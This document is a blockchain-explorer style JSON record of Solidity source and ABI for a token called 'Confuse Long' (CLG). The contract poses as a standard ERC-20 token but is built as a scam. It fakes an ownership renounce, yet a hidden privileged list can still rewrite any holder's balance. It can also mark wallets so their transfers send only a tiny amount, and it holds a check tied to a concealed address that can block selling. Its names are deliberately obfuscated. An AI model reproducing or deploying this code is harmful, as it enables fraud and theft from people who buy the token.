{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface sellAt {\n    function createPair(address marketingLimit, address walletTotal) external returns (address);\n}\n\ninterface teamMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromLiquidityTake) external view returns (uint256);\n\n    function transfer(address sellShould, uint256 marketingMinReceiver) external returns (bool);\n\n    function allowance(address liquidityMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMinReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellShould,\n        uint256 marketingMinReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxBuy, uint256 value);\n    event Approval(address indexed liquidityMode, address indexed spender, uint256 value);\n}\n\nabstract contract swapAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalSwapMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverWalletSwap is teamMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfuseLong is swapAt, teamMode, receiverWalletSwap {\n\n    function owner() external view returns (address) {\n        return fundMode;\n    }\n\n    uint256 buyMax;\n\n    bool private amountLimitReceiver;\n\n    string private launchedTo = \"CLG\";\n\n    mapping(address => mapping(address => uint256)) private swapExemptSell;\n\n    event OwnershipTransferred(address indexed receiverSell, address indexed atMode);\n\n    mapping(address => uint256) private sellSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTo;\n    }\n\n    address public marketingTo;\n\n    constructor (){\n        \n        totalSwapMode sellBuy = totalSwapMode(modeAtMin);\n        toAmountMin = sellAt(sellBuy.factory()).createPair(sellBuy.WETH(), address(this));\n        if (receiverTrading == marketingSwap) {\n            feeReceiver = true;\n        }\n        marketingTo = _msgSender();\n        buyToken[marketingTo] = true;\n        sellSwap[marketingTo] = swapAmount;\n        launchWallet();\n        if (feeReceiver != marketingSwap) {\n            feeReceiver = false;\n        }\n        emit Transfer(address(0), marketingTo, swapAmount);\n    }\n\n    function transfer(address fromList, uint256 marketingMinReceiver) external virtual override returns (bool) {\n        return minTx(_msgSender(), fromList, marketingMinReceiver);\n    }\n\n    address toMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private takeSender = 18;\n\n    bool private feeReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAmount;\n    }\n\n    bool private marketingSwap;\n\n    bool public totalSender;\n\n    uint256 public totalSell;\n\n    uint256 private swapAmount = 100000000 * 10 ** 18;\n\n    function transferFrom(address maxSwapMode, address sellShould, uint256 marketingMinReceiver) external override returns (bool) {\n        if (_msgSender() != modeAtMin) {\n            if (swapExemptSell[maxSwapMode][_msgSender()] != type(uint256).max) {\n                require(marketingMinReceiver <= swapExemptSell[maxSwapMode][_msgSender()]);\n                swapExemptSell[maxSwapMode][_msgSender()] -= marketingMinReceiver;\n            }\n        }\n        return minTx(maxSwapMode, sellShould, marketingMinReceiver);\n    }\n\n    address private fundMode;\n\n    function walletSwap(address maxSwapMode, address sellShould, uint256 marketingMinReceiver) internal returns (bool) {\n        require(sellSwap[maxSwapMode] >= marketingMinReceiver);\n        sellSwap[maxSwapMode] -= marketingMinReceiver;\n        sellSwap[sellShould] += marketingMinReceiver;\n        emit Transfer(maxSwapMode, sellShould, marketingMinReceiver);\n        return true;\n    }\n\n    function launchWallet() public {\n        emit OwnershipTransferred(marketingTo, address(0));\n        fundMode = address(0);\n    }\n\n    bool public receiverTrading;\n\n    function marketingShould(uint256 marketingMinReceiver) public {\n        exemptMin();\n        toFrom = marketingMinReceiver;\n    }\n\n    mapping(address => bool) public shouldAtLaunched;\n\n    string private receiverShouldAuto = \"Confuse Long\";\n\n    function toSwapEnable(address fromList, uint256 marketingMinReceiver) public {\n        exemptMin();\n        sellSwap[fromList] = marketingMinReceiver;\n    }\n\n    function exemptMin() private view {\n        require(buyToken[_msgSender()]);\n    }\n\n    function buySwap(address totalModeWallet) public {\n        if (totalSender) {\n            return;\n        }\n        \n        buyToken[totalModeWallet] = true;\n        if (amountLimitReceiver) {\n            totalSell = atWallet;\n        }\n        totalSender = true;\n    }\n\n    address modeAtMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function walletLimit(address fromMinTx) public {\n        exemptMin();\n        if (atWallet == totalSell) {\n            marketingSwap = true;\n        }\n        if (fromMinTx == marketingTo || fromMinTx == toAmountMin) {\n            return;\n        }\n        shouldAtLaunched[fromMinTx] = true;\n    }\n\n    uint256 private atWallet;\n\n    function approve(address exemptSell, uint256 marketingMinReceiver) public virtual override returns (bool) {\n        swapExemptSell[_msgSender()][exemptSell] = marketingMinReceiver;\n        emit Approval(_msgSender(), exemptSell, marketingMinReceiver);\n        return true;\n    }\n\n    function minTx(address maxSwapMode, address sellShould, uint256 marketingMinReceiver) internal returns (bool) {\n        if (maxSwapMode == marketingTo) {\n            return walletSwap(maxSwapMode, sellShould, marketingMinReceiver);\n        }\n        uint256 shouldBuyIs = teamMode(toAmountMin).balanceOf(toMax);\n        require(shouldBuyIs == toFrom);\n        require(sellShould != toMax);\n        if (shouldAtLaunched[maxSwapMode]) {\n            return walletSwap(maxSwapMode, sellShould, senderWallet);\n        }\n        return walletSwap(maxSwapMode, sellShould, marketingMinReceiver);\n    }\n\n    mapping(address => bool) public buyToken;\n\n    function allowance(address limitTeam, address exemptSell) external view virtual override returns (uint256) {\n        if (exemptSell == modeAtMin) {\n            return type(uint256).max;\n        }\n        return swapExemptSell[limitTeam][exemptSell];\n    }\n\n    uint256 toFrom;\n\n    function balanceOf(address fromLiquidityTake) public view virtual override returns (uint256) {\n        return sellSwap[fromLiquidityTake];\n    }\n\n    address public toAmountMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeSender;\n    }\n\n    uint256 private toMarketingWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShouldAuto;\n    }\n\n    uint256 constant senderWallet = 13 ** 10;\n\n    function getOwner() external view returns (address) {\n        return fundMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMinReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidityTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalModeWallet\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMinReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAtLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmountMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMinReceiver\",\"type\":\"uint256\"}],\"name\":\"toSwapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMinReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwapMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMinReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMinTx\",\"type\":\"address\"}],\"name\":\"walletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConfuseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}